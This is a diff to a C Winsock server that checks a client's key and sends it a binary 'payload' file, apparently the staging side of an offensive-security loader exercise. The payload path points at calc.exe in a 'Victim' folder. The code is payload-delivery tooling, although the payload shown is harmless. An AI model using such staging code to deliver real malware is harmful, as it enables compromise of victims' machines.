@@ -17,6 +17,13 @@ const char* payload_path = "C:\\Users\\Victim\\Documents\\calc.exe";
 const size_t PREFIX_SIZE = 4;
 
 
+void printBytes(const unsigned char* data, size_t dataLen) {
+	for (size_t i = 0; i < dataLen; ++i) {
+		printf("%02x ", data[i]);
+	}
+	printf("\n");
+}
+
 int initializeWSA(void) {
 	WSADATA wsa_data;
 	return WSAStartup(MAKEWORD(2, 2), &wsa_data);
@@ -171,9 +178,10 @@ int receive_and_validate_key(SOCKET client_socket, const char* expected_key, siz
 	return validation_result;
 }
 
-int fetch_payload(char** payload)
+int fetch_payload(char** payload, size_t* payload_size)
 {
-	printf("[i] Openeing file.\n");
+	printf("[+] Fetching payload from %s ...\n", payload_path);
+
 	// Open the file in binary mode
 	FILE *fp = fopen(payload_path, "rb");
 
@@ -183,13 +191,12 @@ int fetch_payload(char** payload)
         return 1; // Or a custom error code
     }
 
-	printf("[i] Seeking.\n");
 	// Get file size
 	fseek(fp, 0, SEEK_END);
 	long file_size = ftell(fp);
+	*payload_size = file_size;
 	fseek(fp, 0, SEEK_SET); 
 
-	printf("[i] Allocating memory.\n");
 	// Allocate memory for the file contents
 	*payload = (char *)malloc(file_size + 1);
 
@@ -200,7 +207,6 @@ int fetch_payload(char** payload)
 		return 1;
 	}
 
-	printf("[i] Reading bytes into buffer.\n");
 	// Read the file contents into the payload buffer
 	size_t bytes_read = fread(*payload, 1, file_size, fp);
 
@@ -212,11 +218,13 @@ int fetch_payload(char** payload)
 		return 1;
 	}
 
-	printf("[i] Setting null character.\n");
-	// Ensure null termination
-	*payload[file_size] = '\0';
+	if (fclose(fp) != 0)
+	{
+		fprintf(stderr, "[!] fclose() failed. Error code: %d (%s)\n", errno, strerror(errno));
+		free(*payload);
+		return 1;
+	}
 
-	fclose(fp);
 	return 0;
 }
 
@@ -227,6 +235,8 @@ int prepare_message(
 	size_t* prepared_message_size
 )
 {
+	printf("[+] Preparing message ...\n");
+
 	// Allocate memory to the buffer which will hold the prepared message
 	*prepared_message_size = PREFIX_SIZE + raw_message_size;
 	*prepared_message = (char*)malloc(*prepared_message_size);
@@ -249,32 +259,25 @@ int prepare_message(
 	return 0;
 }
 
-void printBytes(const unsigned char* data, size_t dataLen) {
-	for (size_t i = 0; i < dataLen; ++i) {
-		printf("%02x ", data[i]);
-	}
-	printf("\n");
-}
-
-int send_data(SOCKET client_socket, const char* data)
+int send_data(SOCKET client_socket, const char* payload, const size_t payload_size)
 {
 	printf("[+] Sending data to client ....\n");
 
 	char* prepared_message;
 	size_t prepared_message_size;
-	if (prepare_message(data, strlen(data), &prepared_message, &prepared_message_size) != 0)
+	if (prepare_message(payload, payload_size, &prepared_message, &prepared_message_size) != 0)
 	{
 		fprintf(stderr, "[!] prepare_message() failed.\n");
 		return 1;
 	}
-
-	printBytes(prepared_message, prepared_message_size);
 
 	int bytes_sent = send(client_socket, prepared_message, prepared_message_size, 0);
 	if (bytes_sent <= 0) {
 		fprintf(stderr, "[!] send() failed. (%d)\n", WSAGetLastError());
 		return -1;
 	}
+
+	printf("[i] Sent %d bytes to client.\n", bytes_sent - PREFIX_SIZE);
 
 	return 0;
 }
@@ -309,13 +312,14 @@ int main(void)
 	}
 
 	char* payload = NULL;
-	if (fetch_payload(&payload) != 0)
+	size_t payload_size = 0;
+	if (fetch_payload(&payload, &payload_size) != 0)
 	{
 		fprintf(stderr, "[!] fetch_payload() failed.\n");
 		return 1;
 	}
 
-	if (send_data(client_socket, payload) != 0) {
+	if (send_data(client_socket, payload, payload_size) != 0) {
 		free(payload);
 		cleanup(listening_socket, client_socket);
 		return 1;
